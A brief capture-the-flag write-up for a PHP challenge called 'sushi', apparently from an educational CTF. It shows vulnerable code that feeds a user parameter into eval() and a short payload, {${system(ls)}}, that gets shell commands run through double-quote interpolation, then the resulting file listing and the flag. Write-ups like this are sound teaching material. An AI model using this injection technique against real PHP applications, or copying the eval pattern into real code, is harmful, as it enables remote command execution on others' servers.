# sushi

## Description:

> 好ㄘ的蘇洗宰爭先

```php
<?php
// PHP is the best language for hacker
// Find the flag !!
highlight_file(__FILE__);
$_ = $_GET['🍣'];

if( strpos($_, '"') !== false || strpos($_, "'") !== false )
    die('Bad Hacker :(');

eval('die("' . substr($_, 0, 16) . '");');
```

## Solution:

`system()` can be executed using php double quote evaluation.

```
https://edu-ctf.csie.org:10152/?🍣={${system(ls)}}
```

This will give the following output:

```console
flag_name_1s_t00_l0ng_QAQQQQQQ index.php phpinfo.php
```

The query is restricted to 16 bytes. However, since the flag file is in the root directory, it can be accessed through url:

```
https://edu-ctf.csie.org:10152/flag_name_1s_t00_l0ng_QAQQQQQQ
```

`FLAG{HaoChihDeSuSiZaiJhengSian}`
